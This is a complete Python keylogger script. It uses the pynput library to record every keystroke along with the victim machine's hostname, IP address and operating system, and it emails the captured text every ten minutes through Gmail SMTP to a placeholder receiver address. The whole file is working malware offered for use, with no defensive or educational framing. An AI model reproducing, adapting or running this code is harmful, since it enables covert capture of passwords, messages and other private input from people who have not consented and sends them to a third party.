from pynput import keyboard
from email.mime.text import MIMEText
from socket import gethostbyname, gethostname
from platform import system
import time
import smtplib

def key_pressed(key):
    global log_data
    if hasattr(key, 'char'):
        log_data += key.char
    else:
        log_data += key_names.get(key, '<unknown key>')

key_names = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '<enter>',
    keyboard.Key.backspace: '<backspace>',
    keyboard.Key.esc: '<esc>',
    keyboard.Key['f1']: '<f1>',
    keyboard.Key['f2']: '<f2>',
    keyboard.Key['f3']: '<f3>',
    keyboard.Key['f4']: '<f4>',
    keyboard.Key['f5']: '<f5>',
    keyboard.Key['f6']: '<f6>',
    keyboard.Key['f7']: '<f7>',
    keyboard.Key['f8']: '<f8>',
    keyboard.Key['f9']: '<f9>',
    keyboard.Key['f10']: '<f10>',
    keyboard.Key['f11']: '<f11>',
    keyboard.Key['f12']: '<f12>',
    keyboard.Key.shift: '<left shift>',
    keyboard.Key.shift_r: '<right shift>',
    keyboard.Key.ctrl: '<ctrl>',
    keyboard.Key.alt: '<alt>',
    keyboard.Key.caps_lock: '<caps lock>',
    keyboard.Key.cmd: '<command key>',
    keyboard.Key.up: '<up arrow>',
    keyboard.Key.down: '<down arrow>',
    keyboard.Key.left: '<left arrow>',
    keyboard.Key.right: '<right arrow>',
    keyboard.Key.insert: '<insert>',
    keyboard.Key.home: '<home>',
    keyboard.Key.page_up: '<page up>',
    keyboard.Key.page_down: '<page down>',
    keyboard.Key.delete: '<delete>',
    keyboard.Key.end: '<end>',
    keyboard.Key.print_screen: '<print screen>',
    keyboard.Key.scroll_lock: '<scroll lock>',
    keyboard.Key.pause: '<pause>',
    keyboard.Key.num_lock: '<num lock>',
    keyboard.Key.tab: '<tab>',
    keyboard.Key.esc: '<esc>'
}

hostname = gethostname()
ip = gethostbyname(hostname) 
os = system()

log_data = ''
last_print = time.time()

def send_email_with_keys(keys):
    sender_email = "senderGmailHere@gmail.com"
    receiver_email = "receiverGmailHere@gmail.com"
    password = "appPasswordHere"
    
    message = MIMEText(keys)
    subject = "Keylogger info from: "+ os +" "+ hostname +" ("+ip+")"
    content = keys
    message['subject'] = subject
    message['from'] = sender_email
    message['to'] = receiver_email
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    server.send_message(message)
    server.quit()

def send_logged_keys():
    global log_data
    if log_data:
        logged_keys = "Logged keys: " + log_data
        log_data = ""
        send_email_with_keys(logged_keys)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    while True:
        time.sleep(600) #Wait 10 minutes (600 seconds) before sending email, you can change that if you want.
        send_logged_keys()